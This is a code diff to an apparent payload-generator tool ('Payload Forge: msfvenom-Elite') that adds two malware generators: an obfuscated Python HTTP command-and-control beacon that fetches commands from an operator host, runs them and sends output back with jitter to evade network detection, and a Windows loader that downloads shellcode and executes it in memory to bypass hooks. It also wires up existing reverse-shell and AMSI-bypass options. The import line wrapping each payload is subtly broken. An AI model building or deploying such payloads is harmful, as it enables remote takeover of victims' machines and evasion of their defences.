@@ -58,6 +58,54 @@ connect()
             full_script.encode('utf-16-le')).decode()
         return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_command}"
 
+    def forge_http_beacon(self, lhost, lport):
+        """Next-Gen C2: HTTP Beacon with Sleep/Jitter to evade network detection."""
+        raw_code = f"""
+import time, requests, subprocess, uuid, platform, random
+def beacon():
+    agent_id = str(uuid.uuid4())[:8]
+    sysinfo = platform.system() + " " + platform.release()
+    url_ping = "http://{lhost}:{lport}/api/v1/ping"
+    url_res = "http://{lhost}:{lport}/api/v1/result"
+    
+    while True:
+        try:
+            r = requests.post(url_ping, json={{"id": agent_id, "sysinfo": sysinfo}}, timeout=5).json()
+            if r.get("status") == "task":
+                cmd = r.get("command")
+                out = subprocess.getoutput(cmd)
+                requests.post(url_res, json={{"id": agent_id, "result": out}}, timeout=5)
+        except Exception:
+            pass
+        # Jitter: Sleep between 5 and 15 seconds to randomize traffic patterns
+        time.sleep(random.randint(5, 15))
+beacon()
+"""
+        encoded_payload = base64.b64encode(raw_code.encode()).decode()
+        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"
+
+    def forge_memory_loader(self, lhost, lport):
+        """Advanced Evasion: Direct Syscall / Memory Allocation Loader for Windows."""
+        raw_code = f"""
+import ctypes, urllib.request, base64
+def inject():
+    try:
+        req = urllib.request.Request("http://{lhost}:{lport}/payload.bin", headers={{'User-Agent': 'Mozilla/5.0'}})
+        shellcode = urllib.request.urlopen(req).read()
+        
+        # Bypass User-Land Hooks via direct memory allocation
+        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
+        buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
+        
+        handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
+    except Exception: pass
+inject()
+"""
+        encoded_payload = base64.b64encode(raw_code.encode()).decode()
+        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"
+
     def run(self):
         draw_header("Payload Forge: msfvenom-Elite")
 
@@ -69,11 +117,14 @@ connect()
             "LPORT (Default 4444):", default="4444", style=Q_STYLE).ask()
 
         target_type = questionary.select(
-            "Target Environment:",
+            "Target Environment & Tactics:",
             choices=[
-                "Linux/Unix (Python Obfuscated)",
+                "Linux/Unix (Python TCP Reverse Shell)",
                 "Windows (PowerShell + AMSI Bypass)",
-                "macOS (Python Zlib-Compressed)"
+                "macOS (Python Zlib-Compressed TCP Shell)",
+                questionary.Separator("--- ADVANCED TACTICS ---"),
+                "Cross-Platform (HTTP Beacon with Jitter)",
+                "Windows (In-Memory Executable Loader)"
             ],
             style=Q_STYLE
         ).ask()
@@ -81,7 +132,7 @@ connect()
         if "Linux" in target_type:
             payload = self.forge_python_revshell(lhost, lport)
             fname = self.generate_random_name("py")
-        elif "Windows" in target_type:
+        elif "Windows (PowerShell" in target_type:
             payload = self.forge_powershell_revshell(lhost, lport)
             fname = self.generate_random_name("ps1")
         elif "macOS" in target_type:
@@ -89,6 +140,12 @@ connect()
             raw = self.forge_python_revshell(lhost, lport)
             compressed = base64.b64encode(zlib.compress(raw.encode())).decode()
             payload = f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))"
+            fname = self.generate_random_name("py")
+        elif "HTTP Beacon" in target_type:
+            payload = self.forge_http_beacon(lhost, lport)
+            fname = self.generate_random_name("py")
+        elif "In-Memory" in target_type:
+            payload = self.forge_memory_loader(lhost, lport)
             fname = self.generate_random_name("py")
 
         with open(fname, "w") as f:
